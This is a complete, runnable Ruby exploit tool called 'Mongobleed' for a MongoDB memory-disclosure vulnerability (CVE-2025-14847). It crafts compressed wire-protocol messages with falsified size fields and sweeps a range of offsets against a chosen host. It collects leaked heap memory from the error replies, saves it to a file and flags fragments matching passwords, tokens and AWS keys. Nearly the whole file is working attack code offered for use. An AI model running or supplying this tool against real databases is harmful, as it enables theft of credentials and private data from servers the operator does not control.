#!/usr/bin/env ruby
# frozen_string_literal: true

# Mongobleed - CVE-2025-14847 MongoDB Memory Disclosure Exploit
#
# Exploits improper validation of uncompressed_size in MongoDB's OP_COMPRESSED handler,
# causing buffer over-reads that leak heap memory through error messages.
#
# Author: Demetrius Ford - github.com/demetriusford
# Based on research by Joe Desimone

require "socket"
require "zlib"
require "optparse"
require "set"
require "colorize"

module CVE202514847
  class Error < StandardError; end
  class NetworkError < Error; end
  class DecompressionError < Error; end

  class Compressor
    def compress(data)
      Zlib::Deflate.deflate(data)
    end
  end

  # Constructs BSON documents with inflated length fields to trigger over-reads
  class BSONBuilder
    BSON_CONTENT = "\x10a\x00\x01\x00\x00\x00"

    def build(doc_len)
      [doc_len].pack("l<") + BSON_CONTENT.b
    end
  end

  # Constructs MongoDB wire protocol messages (OP_MSG and OP_COMPRESSED)
  class WireProtocolBuilder
    def build_op_msg(bson)
      [0].pack("L<") + "\x00".b + bson
    end

    # Vulnerability: uncompressed_size (buffer_size) is not validated against actual decompressed size
    def build_op_compressed(compressed_data:, buffer_size:)
      [2013].pack("L<") +        # original_opcode: OP_MSG
        [buffer_size].pack("l<") +     # uncompressed_size: INFLATED VALUE
        [2].pack("C") +                # compressor_id: zlib
        compressed_data
    end
  end

  # Constructs MongoDB wire protocol headers (16 bytes)
  class HeaderBuilder
    HEADER_SIZE = 16
    OPCODE_COMPRESSED = 2012

    def build(payload_size)
      [HEADER_SIZE + payload_size, 1, 0, OPCODE_COMPRESSED].pack("L<L<L<L<")
    end
  end

  # Orchestrates payload construction: BSON → OP_MSG → compress → OP_COMPRESSED → header
  class PayloadBuilder
    def initialize(
      bson_builder:,
      protocol_builder:,
      compressor:,
      header_builder:
    )
      @bson_builder = bson_builder
      @protocol_builder = protocol_builder
      @compressor = compressor
      @header_builder = header_builder
    end

    def build(doc_len:, buffer_size:)
      bson = @bson_builder.build(doc_len)
      op_msg = @protocol_builder.build_op_msg(bson)
      compressed = @compressor.compress(op_msg)
      op_compressed = @protocol_builder.build_op_compressed(
        compressed_data: compressed,
        buffer_size: buffer_size
      )
      @header_builder.build(op_compressed.bytesize) + op_compressed
    end
  end

  class SocketFactory
    SOCKET_TIMEOUT = 2

    def create(host:, port:)
      Socket.new(:INET, :STREAM).tap do |sock|
        sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_RCVTIMEO, [SOCKET_TIMEOUT, 0].pack("l_2"))
        sock.setsockopt(Socket::SOL_SOCKET, Socket::SO_SNDTIMEO, [SOCKET_TIMEOUT, 0].pack("l_2"))
        sock.connect(Socket.sockaddr_in(port, host))
      end
    end
  end

  # Reads complete MongoDB messages using the message length field for framing
  class SocketReader
    RECV_BUFFER_SIZE = 4096

    def read(socket)
      response = String.new(encoding: Encoding::BINARY)

      loop do
        break if response_complete?(response)

        chunk = socket.recv(RECV_BUFFER_SIZE)
        break if chunk.empty?

        response << chunk
      end

      response
    end

    private

    def response_complete?(response)
      return false if response.bytesize < 4

      expected_length = response[0..3].unpack1("L<")
      response.bytesize >= expected_length
    end
  end

  class NetworkClient
    attr_reader :host, :port

    def initialize(host:, port:, socket_factory:, socket_reader:)
      @host = host
      @port = port
      @socket_factory = socket_factory
      @socket_reader = socket_reader
    end

    def send_and_receive(payload)
      socket = @socket_factory.create(host: host, port: port)
      socket.write(payload)
      response = @socket_reader.read(socket)
      socket.close
      response
    rescue SocketError, Errno::ECONNREFUSED, Errno::ETIMEDOUT => e
      raise NetworkError, "Failed to connect to #{host}:#{port} - #{e.message}"
    rescue StandardError
      String.new(encoding: Encoding::BINARY)
    end
  end

  # Decompresses MongoDB error responses containing leaked field names
  class ResponseDecompressor
    MIN_RESPONSE_SIZE = 25
    OPCODE_COMPRESSED = 2012

    def initialize(response)
      @response = response
    end

    def decompress
      return nil if @response.bytesize < MIN_RESPONSE_SIZE

      msg_len = @response[0..3].unpack1("L<")

      if compressed?
        Zlib::Inflate.inflate(@response[25...msg_len])
      else
        @response[16...msg_len]
      end
    rescue Zlib::Error => e
      raise DecompressionError, "Failed to decompress response: #{e.message}"
    end

    private

    def compressed?
      @response[12..15].unpack1("L<") == OPCODE_COMPRESSED
    end
  end

  # Extracts leaked data from MongoDB error messages via regex pattern matching
  class LeakParser
    FIELD_NAME_PATTERN = /field name '([^']*)'/
    TYPE_PATTERN = /type (\d+)/
    IGNORED_FIELDS = ["?", "a", "$db", "ping"].freeze

    def initialize(raw_data)
      @raw_data = raw_data
    end

    def parse
      return [] if @raw_data.nil?

      extract_field_names + extract_type_bytes
    end

    private

    def extract_field_names
      @raw_data.scan(FIELD_NAME_PATTERN).flatten.reject do |data|
        data.empty? || IGNORED_FIELDS.include?(data)
      end
    end

    def extract_type_bytes
      @raw_data.scan(TYPE_PATTERN).map do |match|
        [match.first.to_i & 0xFF].pack("C")
      end
    end
  end

  # Accumulates and deduplicates leaked memory fragments across multiple probe offsets
  class ScanResults
    attr_reader :all_leaked, :unique_leaks

    def initialize
      @all_leaked = String.new(encoding: Encoding::BINARY)
      @unique_leaks = Set.new
    end

    def add(data)
      unique_leaks.add(data)
      all_leaked << data
    end

    def seen?(data)
      unique_leaks.include?(data)
    end

    def total_bytes
      all_leaked.bytesize
    end

    def unique_count
      unique_leaks.size
    end
  end

  class OutputFormatter
    MIN_DISPLAY_SIZE = 10
    PREVIEW_LENGTH = 80

    def print_banner
      puts
      puts "#{"=" * 60}".cyan
      puts "  Mongobleed - CVE-2025-14847 MongoDB Memory Leak".bold
      puts "  Author: Demetrius Ford - github.com/demetriusford".light_black
      puts "#{"=" * 60}".cyan
      puts
    end

    def print_header(host:, port:, min_offset:, max_offset:)
      print_banner
      puts "#{"[*]".blue} Target: #{"#{host}:#{port}".bold}"
      puts "#{"[*]".blue} Offset range: #{"#{min_offset}".bold} to #{"#{max_offset}".bold}"
      puts "#{"[*]".blue} Starting memory scan..."
      puts
    end

    def print_leak(data:, offset:)
      return unless data.bytesize > MIN_DISPLAY_SIZE

      preview = data[0...PREVIEW_LENGTH]
        .force_encoding(Encoding::UTF_8)
        .scrub("?")

      offset_str = format("%04d", offset).cyan
      size_str = format("%4d bytes", data.bytesize).magenta
      puts "#{"[+]".green} Offset #{offset_str} | Size: #{size_str} | #{preview}"
    end

    def print_summary(total_bytes:, unique_count:, output_path:)
      puts
      puts "#{"=" * 60}".cyan
      puts "#{"[*]".blue} Scan complete!"
      puts
      puts "#{"[*]".blue} Total leaked data: #{"#{total_bytes} bytes".green}"
      puts "#{"[*]".blue} Unique fragments: #{"#{unique_count}".green}"
      puts "#{"[*]".blue} Output saved to: #{output_path.bold}"
    end

    def print_secret_found(pattern)
      puts "#{"[!]".yellow} Potential secret detected: #{pattern.upcase.red}"
    end

    def print_secrets_header
      puts
      puts "#{"-" * 60}".yellow
      puts "#{"[!]".yellow} Scanning for sensitive patterns..."
      puts "#{"-" * 60}".yellow
    end

    def print_no_secrets
      puts "#{"[*]".blue} No obvious secrets detected in leaked data"
    end

    def print_secrets_footer
      puts "#{"-" * 60}".yellow
    end
  end

  class FileWriter
    def write(path:, data:)
      File.binwrite(path, data)
    end
  end

  # Detects common secret patterns in leaked memory (passwords, tokens, API keys)
  class SecretDetector
    SECRET_PATTERNS = %w[password secret key token admin AKIA].freeze

    def initialize(data)
      @data = data
    end

    def detect
      downcase_data = @data.downcase

      SECRET_PATTERNS.select do |pattern|
        downcase_data.include?(pattern.downcase)
      end
    end
  end

  class MemoryProbe
    def initialize(network_client:, payload_builder:)
      @network_client = network_client
      @payload_builder = payload_builder
    end

    def send_probe(doc_len:, buffer_size:)
      payload = @payload_builder.build(doc_len: doc_len, buffer_size: buffer_size)
      @network_client.send_and_receive(payload)
    end
  end

  class LeakExtractor
    def initialize(decompressor:, parser:)
      @decompressor = decompressor
      @parser = parser
    end

    def extract(response)
      raw_data = @decompressor.new(response).decompress
      @parser.new(raw_data).parse
    rescue StandardError
      []
    end
  end

  # Iterates through document length offsets with 500-byte overflow window
  # to systematically scan heap memory at different locations
  class OffsetScanner
    BUFFER_SIZE_OFFSET = 500

    def initialize(min_offset:, max_offset:, memory_probe:, leak_extractor:)
      @min_offset = min_offset
      @max_offset = max_offset
      @memory_probe = memory_probe
      @leak_extractor = leak_extractor
    end

    def each_leak
      (@min_offset...@max_offset).each do |doc_len|
        response = @memory_probe.send_probe(
          doc_len: doc_len,
          buffer_size: doc_len + BUFFER_SIZE_OFFSET
        )
        leaks = @leak_extractor.extract(response)

        leaks.each do |leak_data|
          yield leak_data, doc_len
        end
      end
    end
  end

  class ExploitRunner
    def initialize(
      offset_scanner:,
      results:,
      output_formatter:,
      file_writer:,
      secret_detector_class:,
      output_path:
    )
      @offset_scanner = offset_scanner
      @results = results
      @output_formatter = output_formatter
      @file_writer = file_writer
      @secret_detector_class = secret_detector_class
      @output_path = output_path
    end

    def execute
      collect_leaks
      save_results
      print_summary
      detect_and_print_secrets
    end

    private

    def collect_leaks
      @offset_scanner.each_leak do |leak_data, offset|
        next if @results.seen?(leak_data)

        @results.add(leak_data)
        @output_formatter.print_leak(data: leak_data, offset: offset)
      end
    end

    def save_results
      @file_writer.write(path: @output_path, data: @results.all_leaked)
    end

    def print_summary
      @output_formatter.print_summary(
        total_bytes: @results.total_bytes,
        unique_count: @results.unique_count,
        output_path: @output_path
      )
    end

    def detect_and_print_secrets
      detector = @secret_detector_class.new(@results.all_leaked)
      detected_secrets = detector.detect

      if detected_secrets.any?
        @output_formatter.print_secrets_header
        detected_secrets.each do |pattern|
          @output_formatter.print_secret_found(pattern)
        end
        @output_formatter.print_secrets_footer
      else
        @output_formatter.print_no_secrets
      end
    end
  end

  class OptionsParser
    DEFAULT_OPTIONS = {
      host: "localhost",
      port: 27017,
      min_offset: 20,
      max_offset: 8192,
      output: "leaked.bin",
    }.freeze

    def parse(args = ARGV)
      options = DEFAULT_OPTIONS.dup

      OptionParser.new do |opts|
        opts.banner = "Usage: #{$PROGRAM_NAME} [options]"

        opts.on("--host HOST", "Target host (default: localhost)") do |v|
          options[:host] = v
        end

        opts.on("--port PORT", Integer, "Target port (default: 27017)") do |v|
          options[:port] = v
        end

        opts.on("--min-offset MIN", Integer, "Min doc length (default: 20)") do |v|
          options[:min_offset] = v
        end

        opts.on("--max-offset MAX", Integer, "Max doc length (default: 8192)") do |v|
          options[:max_offset] = v
        end

        opts.on("--output FILE", "Output file (default: leaked.bin)") do |v|
          options[:output] = v
        end

        opts.on("-h", "--help", "Show this help") do
          puts opts
          exit
        end
      end.parse!(args)

      options
    end
  end

  class Scanner
    def initialize(options)
      @options = options
      @output_formatter = OutputFormatter.new
    end

    def run
      print_header
      workflow = build_workflow
      workflow.execute
    rescue Error => e
      warn "#{"[-]".red} Error: #{e.message}"
      exit 1
    end

    private

    def print_header
      @output_formatter.print_header(
        host: @options[:host],
        port: @options[:port],
        min_offset: @options[:min_offset],
        max_offset: @options[:max_offset]
      )
    end

    def build_workflow
      ExploitRunner.new(
        offset_scanner: build_offset_scanner,
        results: ScanResults.new,
        output_formatter: @output_formatter,
        file_writer: FileWriter.new,
        secret_detector_class: SecretDetector,
        output_path: @options[:output]
      )
    end

    def build_offset_scanner
      OffsetScanner.new(
        min_offset: @options[:min_offset],
        max_offset: @options[:max_offset],
        memory_probe: build_memory_probe,
        leak_extractor: build_leak_extractor
      )
    end

    def build_memory_probe
      MemoryProbe.new(
        network_client: build_network_client,
        payload_builder: build_payload_builder
      )
    end

    def build_network_client
      NetworkClient.new(
        host: @options[:host],
        port: @options[:port],
        socket_factory: SocketFactory.new,
        socket_reader: SocketReader.new
      )
    end

    def build_payload_builder
      PayloadBuilder.new(
        bson_builder: BSONBuilder.new,
        protocol_builder: WireProtocolBuilder.new,
        compressor: Compressor.new,
        header_builder: HeaderBuilder.new
      )
    end

    def build_leak_extractor
      LeakExtractor.new(
        decompressor: ResponseDecompressor,
        parser: LeakParser
      )
    end
  end

  class CLI
    def self.run
      new.run
    end

    def run
      options = OptionsParser.new.parse
      Scanner.new(options).run
    end
  end
end

CVE202514847::CLI.run if __FILE__ == $PROGRAM_NAME
